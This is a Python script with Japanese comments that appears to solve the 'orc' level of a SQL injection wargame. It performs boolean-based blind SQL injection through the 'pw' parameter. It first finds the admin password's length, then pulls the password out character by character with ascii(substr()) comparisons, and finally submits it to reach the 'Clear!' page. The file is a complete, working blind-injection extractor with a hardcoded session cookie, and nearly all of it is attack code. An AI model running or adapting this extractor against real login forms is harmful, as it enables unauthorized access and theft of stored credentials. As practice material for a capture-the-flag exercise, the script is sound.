# coding: utf-8

'''
    orc
    1．orを活用して論理演算の結果を操作
'''
import requests
import re

'''
    pwの長さを特定する
'''
def findPwLength(url, cookies):
    pwLength = 0
    findFlag = False
    h2Pattern = re.compile(r'Hello admin')
    for i in range(1, 10):
        params = {'pw': "0' or id = 'admin' and length(pw) = %d #" % i}
        r = requests.get(url=url, params=params, cookies=cookies)
        responseStr = r.content.decode('utf-8')
        if h2Pattern.search(responseStr):
            print("pw length is %d" % i)
            pwLength = i
            findFlag = True
    
    if findFlag == False:
        print('not found')

    return pwLength
    

'''
    pwのを当てる
    33~127まで
'''
def findPwString(url, cookies, pwLength):

    result = ''
    h2Pattern = re.compile(r'Hello admin')

    for i in range(1, pwLength):
        print(i)
        for n in range(33, 127):
            params = {'pw': "0' or id = 'admin' and ascii(substr(pw,{pwIndex},1)) = {asciiIndex} #".format(pwIndex=i, asciiIndex=n)}
            r = requests.get(url=url, params=params, cookies=cookies)
            responseStr = r.content.decode('utf-8')
            if h2Pattern.search(responseStr):                
                result += chr(n)
    return result


if __name__ == "__main__":
    url = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'
    cookies = {'PHPSESSID': '1n2m871r2tvs2q678csnl0o3u0'}
    pwLength = findPwLength(url, cookies) + 1
    pwString = findPwString(url, cookies, pwLength)
    
    params = {'pw': pwString}
    
    r = requests.get(url=url, params=params, cookies=cookies)
    responseStr = r.content.decode('utf-8')

    clearPattern = re.compile(r'Clear\!')
    if clearPattern.search(responseStr):
        print(responseStr)
        print('solve')
    else:
        print('no')
        print(responseStr.split('</strong>')[0].split('<strong>')[1])
        print(responseStr.split('</h2>')[0].split('<h2>')[1])
